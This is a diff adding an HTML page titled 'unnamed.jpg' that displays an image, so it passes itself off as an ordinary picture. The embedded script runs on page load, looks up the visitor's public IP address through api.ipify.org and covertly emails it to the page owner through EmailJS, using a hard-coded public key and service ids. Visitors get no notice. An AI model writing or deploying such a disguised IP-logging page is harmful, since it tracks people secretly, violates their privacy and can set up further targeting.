@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>unnamed.jpg</title>
+    <img src="unnamed.jpg">
+</head>
+<body>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        emailjs.init({
+			publicKey: "dpumsvWdFgZPwi5-W",
+		});
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                var emailData = {
+                    poop: data.ip
+                };
+
+                emailjs.send('service_0ugco4i', 'template_d7pq6jg', emailData).then(
+					(response) => {
+                        console.log("poop:", response.text);
+                    },
+                    (error) => {
+                        console.error("poop:", error);
+                    },
+				);
+            })
+            .catch(error => {
+                document.querySelector('.loading').textContent = 'poop.';
+            });
+    </script>
+</body>
+</html>
